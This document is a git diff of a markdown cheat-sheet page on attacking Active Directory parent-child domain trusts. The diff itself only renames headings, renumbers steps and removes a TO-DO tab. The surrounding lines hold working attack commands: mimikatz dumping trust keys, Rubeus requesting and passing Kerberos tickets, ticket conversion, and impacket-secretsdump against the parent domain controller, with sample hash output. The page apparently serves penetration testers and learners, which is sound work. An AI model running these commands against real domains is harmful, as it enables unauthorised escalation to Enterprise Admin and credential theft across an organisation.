@@ -1,7 +1,9 @@
 ---
 title: "Domain Trusts"
-tags: ["Active Directory",  "Privilege Escalation",  "Domain Trusts",  "Parent-Child Trust",  "Kerberos",  "Golden Ticket",  "Mimikatz",  "Rubeus",  "Pass-The-Ticket",  "Ticket Granting Ticket",  "Credential Dumping",  "Cross-Domain Attack",  "Windows"]
+tags: ["Active Directory", "Domain Trusts", "Credential Dumping", "Cross-Domain Attack", "Golden Ticket", "Kerberos", "Mimikatz", "Parent-Child Trust", "Pass-The-Ticket", "Privilege Escalation", "Rubeus", "Ticket Granting Ticket", "Windows"]
 ---
+
+{{< filter_buttons >}}
 
 ### Check Trust Relationships
 
@@ -88,7 +90,7 @@ corp.example.com example.com  ParentChild  Bidirectional
 .\mimikatz.exe "lsadump::trust /patch" "exit"
 ```
 
-#### 2. Request a TGT
+#### 2. Request a Ticket
 
 ```console
 .\rubeus.exe asktgt /user:<CURRENT_DOMAIN>$ /domain:<TARGET_DOMAIN> /rc4:<HASH> /nowrap /ptt
@@ -98,7 +100,7 @@ corp.example.com example.com  ParentChild  Bidirectional
 
 ---
 
-### Privesc from DA (Domain Admin) to EA (Enterprise Admin)
+### From DA (Domain Admin) to EA (Enterprise Admin)
 
 {{< tab set3 tab1 >}}Windows{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
@@ -247,13 +249,7 @@ PS C:\programdata> .\rubeus.exe asktgs /service:cifs/dc01.example.com /domain:EX
 
 {{< /tabcontent >}}
 
-#### 5. Secrets Dump
-
-{{< tab set4 tab1 >}}Linux{{< /tab >}}
-{{< tab set4 tab2 >}}Windows{{< /tab >}}
-{{< tabcontent set4 tab1 >}}
-
-#### 1. Convert kirbi to ccache
+#### 5. Convert kirbi to ccache
 
 ```console
 python3 rubeustoccache.py '<BASE64_TICKET>' administrator.kirbi administrator.ccache
@@ -274,9 +270,10 @@ $ python3 rubeustoccache.py 'doIFAjCCBP ---[SNIP]--- 9zdC5odGI=' administrator.k
 [*] All done! Don't forget to set your environment variable: export KRB5CCNAME=administrator.ccache
 ```
 
-#### 2. Secrets Dump
+#### 6. Secrets Dump
 
 ```console
+# Pass-the-ticket
 export KRB5CCNAME=administrator.ccache
 ```
 
@@ -285,6 +282,7 @@ $ export KRB5CCNAME=administrator.ccache
 ```
 
 ```console
+# Ticket-based Kerberos
 sudo ntpdate -s <PARENT_DC> && impacket-secretsdump administrator@<PARENT_DOMAIN> -k -no-pass
 ```
 
@@ -301,14 +299,3 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:59920e994636168744039017dcf4
 ```
 
 <small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>
-
-{{< /tabcontent >}}
-{{< tabcontent set4 tab2 >}}
-
-#### 1. TO-DO
-
-```console
-TO-DO
-```
-
-{{< /tabcontent >}}
